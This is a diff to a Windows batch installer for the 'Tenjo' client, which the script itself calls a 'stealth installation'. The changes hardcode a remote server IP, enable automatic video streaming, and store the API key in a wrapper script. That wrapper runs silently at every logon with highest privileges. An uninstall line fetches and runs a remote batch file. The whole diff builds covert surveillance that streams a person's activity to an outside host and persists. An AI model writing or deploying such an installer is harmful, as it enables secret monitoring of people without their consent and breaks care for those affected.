@@ -81,26 +81,49 @@ echo # Package init > "%INSTALL_DIR%\src\utils\__init__.py"
 
 echo [%date% %time%] Source files downloaded successfully
 
-REM Update configuration if needed
-if not "%SERVER_URL%"=="http://127.0.0.1:8000" (
+REM Update configuration for production
+echo [%date% %time%] Updating configuration for production...
+if not "%SERVER_URL%"=="http://103.129.149.67" (
     echo [%date% %time%] Updating server URL configuration...
     powershell -Command "(Get-Content '%INSTALL_DIR%\src\core\config.py') -replace 'http://127.0.0.1:8000', '%SERVER_URL%' | Set-Content '%INSTALL_DIR%\src\core\config.py'"
 )
 
+REM Enable auto video streaming for production
+echo [%date% %time%] Enabling auto video streaming for production...
+setx TENJO_AUTO_VIDEO "true" >nul
+set "TENJO_AUTO_VIDEO=true"
+echo [%date% %time%] Auto video streaming enabled (TENJO_AUTO_VIDEO=true)
+
 REM Create Windows service using Task Scheduler
-echo [%date% %time%] Creating Windows service for auto-start...
+echo [%date% %time%] Creating Windows service for auto-start with environment variables...
 schtasks /delete /tn "%SERVICE_NAME%" /f >nul 2>&1
-schtasks /create /tn "%SERVICE_NAME%" /tr "\"%PYTHON_VENV%\Scripts\python.exe\" \"%INSTALL_DIR%\main.py\"" /sc onlogon /ru "%USERNAME%" /rl highest /f >nul
+
+REM Create batch wrapper with environment variables
+echo @echo off > "%INSTALL_DIR%\start_tenjo.bat"
+echo set "TENJO_AUTO_VIDEO=true" >> "%INSTALL_DIR%\start_tenjo.bat"
+echo set "TENJO_SERVER_URL=%SERVER_URL%" >> "%INSTALL_DIR%\start_tenjo.bat"
+echo set "TENJO_API_KEY=%API_KEY%" >> "%INSTALL_DIR%\start_tenjo.bat"
+echo cd /d "%INSTALL_DIR%" >> "%INSTALL_DIR%\start_tenjo.bat"
+echo "%PYTHON_VENV%\Scripts\python.exe" main.py >> "%INSTALL_DIR%\start_tenjo.bat"
+
+schtasks /create /tn "%SERVICE_NAME%" /tr "\"%INSTALL_DIR%\start_tenjo.bat\"" /sc onlogon /ru "%USERNAME%" /rl highest /f >nul
 if errorlevel 1 (
     echo [%date% %time%] WARNING: Failed to create scheduled task
 ) else (
-    echo [%date% %time%] Scheduled task created successfully
+    echo [%date% %time%] Scheduled task created successfully with auto video streaming
 )
 
 REM Start the client immediately
-echo [%date% %time%] Starting Tenjo client...
+echo [%date% %time%] Starting Tenjo client with auto video streaming...
 cd /d "%INSTALL_DIR%"
+
+REM Set environment variables for auto video streaming
+set "TENJO_AUTO_VIDEO=true"
+set "TENJO_SERVER_URL=%SERVER_URL%"
+set "TENJO_API_KEY=%API_KEY%"
+
 start /b "TenjoClient" "%PYTHON_VENV%\Scripts\python.exe" main.py
+echo [%date% %time%] Client started in background with auto video streaming enabled
 timeout /t 3 >nul
 
 REM Test installation
@@ -114,13 +137,16 @@ if errorlevel 1 (
 
 REM Show client info
 echo [%date% %time%] Client Information:
-"%PYTHON_VENV%\Scripts\python.exe" -c "import sys; sys.path.append('src'); from core.config import Config; print(f'Client ID: {Config.CLIENT_ID}'); print(f'Server URL: {Config.SERVER_URL}'); print(f'Installation path: %INSTALL_DIR%')" 2>nul
+set "TENJO_AUTO_VIDEO=true"
+"%PYTHON_VENV%\Scripts\python.exe" -c "import sys; sys.path.append('src'); from core.config import Config; print(f'Client ID: {Config.CLIENT_ID}'); print(f'Server URL: {Config.SERVER_URL}'); print(f'Auto Video Streaming: {Config.AUTO_START_VIDEO_STREAMING}'); print(f'Installation path: %INSTALL_DIR%')" 2>nul
 
 echo.
 echo ================================
 echo Tenjo stealth installation completed!
 echo Installation directory: %INSTALL_DIR%
 echo Dashboard: %SERVER_URL%
+echo Auto Video Streaming: ENABLED
+echo Client will start video streaming immediately
 echo To uninstall: powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_windows.bat' -OutFile '%%TEMP%%\uninstall.bat' -UseBasicParsing; cmd /c '%%TEMP%%\uninstall.bat'; del '%%TEMP%%\uninstall.bat'"
 echo ================================
 
